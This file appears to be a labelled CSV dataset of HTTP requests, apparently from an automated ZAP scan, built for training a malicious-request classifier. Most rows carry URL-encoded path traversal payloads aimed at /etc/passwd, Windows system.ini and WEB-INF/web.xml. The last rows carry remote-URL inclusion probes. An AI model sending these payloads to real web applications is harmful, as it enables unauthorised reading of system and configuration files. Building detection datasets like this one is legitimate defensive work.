method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
POST,/sendFeedback,cfile=comments.txt&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,187,1,bad
POST,/sendFeedback,cfile=comments.txt&name=c%3A%5CWindows%5Csystem.ini&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,142,1,bad
POST,/doLogin,uid=ZAP&passw=c%3A%2F&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,33,1,bad
POST,/sendFeedback,cfile=comments.txt&name=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,187,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%2Fetc%2Fpasswd&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,132,0,bad
POST,/doLogin,uid=ZAP&passw=%2F&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,31,1,bad
POST,/sendFeedback,cfile=comments.txt&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,179,0,bad
POST,/sendFeedback,cfile=comments.txt&name=c%3A%2F&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,124,0,bad
POST,/doLogin,uid=ZAP&passw=c%3A%5C&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,33,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%2F&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,122,0,bad
POST,/sendFeedback,cfile=comments.txt&name=c%3A%5C&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,124,0,bad
POST,/doLogin,uid=ZAP&passw=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,78,1,bad
POST,/sendFeedback,cfile=comments.txt&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,169,0,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=c%3A%2FWindows%2Fsystem.ini,0,0,0,0,0,0,0,0,0,12,44,1,bad
POST,/sendFeedback,cfile=comments.txt&name=WEB-INF%2Fweb.xml&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,136,0,bad
POST,/doLogin,uid=ZAP&passw=WEB-INF%2Fweb.xml&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,45,1,bad
POST,/sendFeedback,cfile=comments.txt&name=WEB-INF%5Cweb.xml&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,136,0,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,0,0,0,0,0,0,0,0,0,12,89,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%2FWEB-INF%2Fweb.xml&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,137,0,bad
POST,/doLogin,uid=ZAP&passw=WEB-INF%5Cweb.xml&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,45,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%5CWEB-INF%5Cweb.xml&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,137,0,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=c%3A%5CWindows%5Csystem.ini,0,0,0,0,0,0,0,0,0,12,44,1,bad
POST,/sendFeedback,cfile=comments.txt&name=thishouldnotexistandhopefullyitwillnot&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,159,0,bad
POST,/doLogin,uid=ZAP&passw=%2FWEB-INF%2Fweb.xml&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,46,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=c%3A%2FWindows%2Fsystem.ini&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,142,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,0,0,0,0,0,0,0,0,0,12,89,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,187,1,bad
POST,/doLogin,uid=ZAP&passw=%5CWEB-INF%5Cweb.xml&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,46,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=c%3A%5CWindows%5Csystem.ini&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,142,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%2Fetc%2Fpasswd,0,0,0,0,0,0,0,0,0,12,34,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,187,1,bad
POST,/doLogin,uid=ZAP&passw=thishouldnotexistandhopefullyitwillnot&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,68,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%2Fetc%2Fpasswd&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,132,0,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,0,0,0,0,0,0,0,0,0,12,81,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,179,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=c%3A%2F&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,124,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=c%3A%2FWindows%2Fsystem.ini,0,0,0,0,0,0,0,0,0,8,49,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=c%3A%2F,0,0,0,0,0,0,0,0,0,12,26,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%2F&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,122,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=c%3A%5C&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,124,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,0,0,0,0,0,0,0,0,0,8,94,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%2F,0,0,0,0,0,0,0,0,0,12,24,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,169,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=WEB-INF%2Fweb.xml&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,136,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=c%3A%5CWindows%5Csystem.ini,0,0,0,0,0,0,0,0,0,8,49,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=c%3A%5C,0,0,0,0,0,0,0,0,0,12,26,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=WEB-INF%5Cweb.xml&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,136,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%2FWEB-INF%2Fweb.xml&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,137,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,0,0,0,0,0,0,0,0,0,8,94,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%5CWEB-INF%5Cweb.xml&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,137,0,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,0,0,0,0,0,0,0,0,0,12,71,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=thishouldnotexistandhopefullyitwillnot&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,159,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%2Fetc%2Fpasswd,0,0,0,0,0,0,0,0,0,8,39,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=c%3A%2FWindows%2Fsystem.ini&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,98,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=WEB-INF%2Fweb.xml,0,0,0,0,0,0,0,0,0,12,38,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,143,1,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,0,0,0,0,0,0,0,0,0,8,86,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=c%3A%5CWindows%5Csystem.ini&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,98,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=WEB-INF%5Cweb.xml,0,0,0,0,0,0,0,0,0,12,38,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,143,1,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=c%3A%2F,0,0,0,0,0,0,0,0,0,8,31,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%2Fetc%2Fpasswd&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,88,0,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%2FWEB-INF%2Fweb.xml,0,0,0,0,0,0,0,0,0,12,39,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,135,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=c%3A%2F&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,80,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%2F,0,0,0,0,0,0,0,0,0,8,29,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%5CWEB-INF%5Cweb.xml,0,0,0,0,0,0,0,0,0,12,39,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%2F&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,78,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=c%3A%5C&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,80,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=c%3A%5C,0,0,0,0,0,0,0,0,0,8,31,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=thishouldnotexistandhopefullyitwillnot,0,0,0,0,0,0,0,0,0,12,61,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,125,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=WEB-INF%2Fweb.xml&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,92,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,0,0,0,0,0,0,0,0,0,8,76,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=WEB-INF%5Cweb.xml&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,92,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=WEB-INF%2Fweb.xml,0,0,0,0,0,0,0,0,0,8,43,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%2FWEB-INF%2Fweb.xml&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,93,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%5CWEB-INF%5Cweb.xml&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,93,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=WEB-INF%5Cweb.xml,0,0,0,0,0,0,0,0,0,8,43,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=thishouldnotexistandhopefullyitwillnot&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,115,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=c%3A%2FWindows%2Fsystem.ini&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,145,1,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%2FWEB-INF%2Fweb.xml,0,0,0,0,0,0,0,0,0,8,44,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,190,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=c%3A%5CWindows%5Csystem.ini&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,145,1,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%5CWEB-INF%5Cweb.xml,0,0,0,0,0,0,0,0,0,8,44,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,190,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%2Fetc%2Fpasswd&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,135,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=thishouldnotexistandhopefullyitwillnot,0,0,0,0,0,0,0,0,0,8,66,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,182,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=c%3A%2F&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,127,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%2F&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,125,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=c%3A%5C&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,127,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,172,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=WEB-INF%2Fweb.xml&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,139,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=WEB-INF%5Cweb.xml&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,139,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%2FWEB-INF%2Fweb.xml&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,140,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%5CWEB-INF%5Cweb.xml&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,140,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=thishouldnotexistandhopefullyitwillnot&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,162,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=c%3A%2FWindows%2Fsystem.ini,0,0,0,0,5,0,0,0,0,13,137,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,0,0,0,0,5,0,0,0,0,13,182,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=c%3A%5CWindows%5Csystem.ini,0,0,0,0,5,0,0,0,0,13,137,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,0,0,0,0,5,0,0,0,0,13,182,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=%2Fetc%2Fpasswd,0,0,0,0,5,0,0,0,0,13,127,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,0,0,0,0,5,0,0,0,0,13,174,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=c%3A%2F,0,0,0,0,5,0,0,0,0,13,119,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=%2F,0,0,0,0,5,0,0,0,0,13,117,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=c%3A%5C,0,0,0,0,5,0,0,0,0,13,119,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,0,0,0,0,5,0,0,0,0,13,164,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=WEB-INF%2Fweb.xml,0,0,0,0,5,0,0,0,0,13,131,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=WEB-INF%5Cweb.xml,0,0,0,0,5,0,0,0,0,13,131,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=%2FWEB-INF%2Fweb.xml,0,0,0,0,5,0,0,0,0,13,132,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=%5CWEB-INF%5Cweb.xml,0,0,0,0,5,0,0,0,0,13,132,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=thishouldnotexistandhopefullyitwillnot,0,0,0,0,5,0,0,0,0,13,154,0,bad
POST,/sendFeedback,cfile=http%3A%2F%2Fwww.google.com%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,134,0,bad
POST,/doSubscribe,txtEmail=http%3A%2F%2Fwww.google.com%2F&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,51,0,bad
POST,/doLogin,uid=http%3A%2F%2Fwww.google.com%2F&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,52,1,bad
POST,/sendFeedback,cfile=http%3A%2F%2Fwww.google.com%3A80%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,137,0,bad
POST,/doLogin,uid=http%3A%2F%2Fwww.google.com%3A80%2F&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,55,1,bad
POST,/doSubscribe,txtEmail=http%3A%2F%2Fwww.google.com%3A80%2F&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,54,0,bad
POST,/sendFeedback,cfile=http%3A%2F%2Fwww.google.com&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,133,0,bad
POST,/doLogin,uid=http%3A%2F%2Fwww.google.com&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,51,1,bad
GET,/Privacypolicy.jsp?sec=http%3A%2F%2Fwww.google.com%2F&template=US,,0,0,0,0,0,0,0,0,0,57,0,0,bad
POST,/doSubscribe,txtEmail=http%3A%2F%2Fwww.google.com&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,50,0,bad
